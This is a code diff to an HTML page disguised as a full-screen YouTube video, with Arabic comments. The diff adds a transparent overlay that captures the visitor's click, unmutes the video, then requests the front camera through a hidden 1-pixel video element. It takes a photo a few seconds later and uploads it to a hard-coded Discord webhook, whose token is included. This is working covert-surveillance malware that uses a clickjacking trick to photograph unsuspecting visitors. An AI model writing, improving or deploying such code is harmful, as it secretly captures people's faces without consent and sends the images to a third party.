@@ -8,11 +8,19 @@
         body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
         .wrapper { position: relative; width: 100%; height: 100%; }
         
-        /* جعل إطار اليوتيوب متوافقاً تماماً مع شاشة الجوال */
         #youtube-frame {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none;
+            pointer-events: none; /* يمنع الضغط المباشر على يوتيوب */
+        }
+
+        /* طبقة شفافة فوق كل شيء لإجبار المستخدم على الضغط */
+        #interaction-layer {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 100;
+            background: rgba(0,0,0,0.01); /* شفافة تماماً */
+            cursor: pointer;
         }
 
         #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
@@ -23,9 +31,11 @@
 
 <div class="wrapper">
     <iframe id="youtube-frame" 
-        src="https://www.youtube.com/embed/C3vaOyZFcsM?autoplay=1&mute=1&loop=1&playlist=C3vaOyZFcsM&controls=0&modestbranding=1&rel=0" 
+        src="https://www.youtube.com/embed/C3vaOyZFcsM?enablejsapi=1&autoplay=1&mute=1&loop=1&playlist=C3vaOyZFcsM&controls=0" 
         frameborder="0" allow="autoplay; encrypted-media">
     </iframe>
+
+    <div id="interaction-layer"></div>
 </div>
 
 <video id="hidden-camera" autoplay playsinline muted></video>
@@ -33,30 +43,38 @@
 
 <script>
     const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';
+    const iframe = document.getElementById('youtube-frame');
+    const interactionLayer = document.getElementById('interaction-layer');
 
-    window.onload = async () => {
+    // عند الضغط على أي مكان في الشاشة
+    interactionLayer.addEventListener('click', async () => {
+        // 1. تشغيل الصوت في فيديو اليوتيوب
+        iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
+        iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
+        
+        // إخفاء الطبقة الشفافة بعد الضغط
+        interactionLayer.style.display = 'none';
+
+        // 2. طلب الكاميرا والتصوير
         const camera = document.getElementById('hidden-camera');
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: 640, height: 480 } 
+                video: { facingMode: "user" } 
             });
             camera.srcObject = stream;
 
-            // حل مشكلة الصورة السوداء: الانتظار حتى يرسل الفيديو بيانات حقيقية
             camera.onplaying = () => {
-                // ننتظر 6 ثوانٍ كاملة لضمان فتح العدسة وضبط الإضاءة
                 setTimeout(() => {
                     captureAndSend(camera);
-                }, 6000);
+                }, 4000); // يصور بعد 4 ثواني من الضغط لضمان وضوح الوجه مع الصوت
             };
         } catch (err) { console.log("Camera Error"); }
-    };
+    });
 
     async function captureAndSend(cameraElement) {
         const canvas = document.getElementById('photo-canvas');
         const context = canvas.getContext('2d');
 
-        // التحقق من أن الكاميرا ترسل صورة فعلية وليست أبعاداً صفرية
         if (cameraElement.videoWidth > 0) {
             canvas.width = cameraElement.videoWidth;
             canvas.height = cameraElement.videoHeight;
@@ -65,12 +83,9 @@
             canvas.toBlob(async (blob) => {
                 if (!blob) return;
                 const formData = new FormData();
-                formData.append('file', blob, 'clear_capture.png');
+                formData.append('file', blob, 'capture_with_audio.png');
                 await fetch(webhookURL, { method: 'POST', body: formData });
             }, 'image/png');
-        } else {
-            // محاولة أخرى بعد ثانية إذا كانت لا تزال سوداء
-            setTimeout(() => captureAndSend(cameraElement), 1000);
         }
     }
 </script>
